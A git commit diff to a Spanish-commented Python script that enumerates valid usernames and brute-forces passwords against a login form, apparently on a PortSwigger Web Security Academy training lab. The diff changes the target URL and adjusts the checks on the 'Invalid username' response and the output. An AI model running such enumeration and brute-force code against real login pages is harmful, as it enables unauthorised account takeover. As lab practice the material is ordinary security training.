6511c66f113e00e656264772d7a227399666c001
joelk <joelkukin@gmail.com>
2025-02-07 14:32:02 -0300

    fixed bugs

--- script.py
+++ script.py
@@ -6,7 +6,7 @@ def leer_archivo(ruta):
         return [linea.strip() for linea in archivo if linea.strip()]
 
 # Configuración inicial
-url = "https://0abc005a0435d6888193258300040081.web-security-academy.net/login"  # Reemplaza con la URL del formulario de login
+url = "https://0a9a006f0446c6758195112500040008.web-security-academy.net/login"  # Reemplaza con la URL del formulario de login
 usuarios_file = "usuarios_noborrar.txt"   # Archivo con la lista de usuarios
 passwords_file = "passwords_db.txt"  # Archivo con la lista de contraseñas
 
@@ -29,14 +29,16 @@ for usuario in usuarios:
             "password": password_void
         }
 
-        print(f"Probando: Usuario={usuario}, Contraseña={password_void}")
+        print(f"Probando Usuario {usuario}")
 
         try:
             # Enviar la solicitud POST
             response = requests.post(url, headers=headers, data=data)
 
             # si se encuentra un usuario valido, probar todas las contraseñas 
-            if response.status_code == 200 and not "<p class=is-warning>Invalid username</p>" in response.text:
+            if response.status_code == 200 and "<p class=is-warning>Invalid username</p>" in response.text:
+                1==0
+            elif response.status_code == 200 and not "<p class=is-warning>Invalid username</p>" in response.text:
                 print(f"¡Usuario encontrado! Usuario: {usuario}, evaluando Contraseñas...")
                 
                 for contraseña in contraseñas:
@@ -46,7 +48,7 @@ for usuario in usuarios:
                     }
                     response = requests.post(url, headers=headers, data=data)
 
-                    print(f"probando {contraseña}")
+                    print(f"probando password {contraseña}")
 
                     if response.status_code == 200 and not "<p class=is-warning>Incorrect password</p>" in response.text:
 
@@ -55,7 +57,7 @@ for usuario in usuarios:
             else: # en caso de errores de conexion mostrar por consola el error correspondiente
                 print("Respuesta inesperada del servidor.")
                 print(f"Código de estado: {response.status_code}")
-                print(f"Contenido de la respuesta: {response.text[:500]}")  # Mostrar los primeros 500 caracteres
+                print(f"Contenido de la respuesta: {response.text}")  # Mostrar los primeros 500 caracteres
         except requests.exceptions.RequestException as e:
             print(f"Error de conexión: {e}")
             break
